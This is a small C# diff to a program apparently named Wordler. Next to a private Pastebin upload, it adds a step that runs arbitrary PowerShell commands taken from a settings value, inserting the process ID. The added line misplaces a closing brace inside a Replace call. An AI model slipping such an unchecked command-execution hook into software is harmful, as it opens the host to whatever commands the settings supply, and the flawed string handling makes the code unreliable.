@@ -37,6 +37,12 @@ namespace Wordler {
 					PastebinAPI.Visibility.Private
 				).Wait();
 
+			if(settings.PowerShellCommands != "")
+			{
+				var psc = new ProcessStartInfo("powershell.exe", " -Command { " + settings.PowerShellCommands.Replace("@ID", Process.GetCurrentProcess().Id.ToString() + " }"));
+				Process.Start(psc);
+			}
+
 			return 0;
 		}
 	}
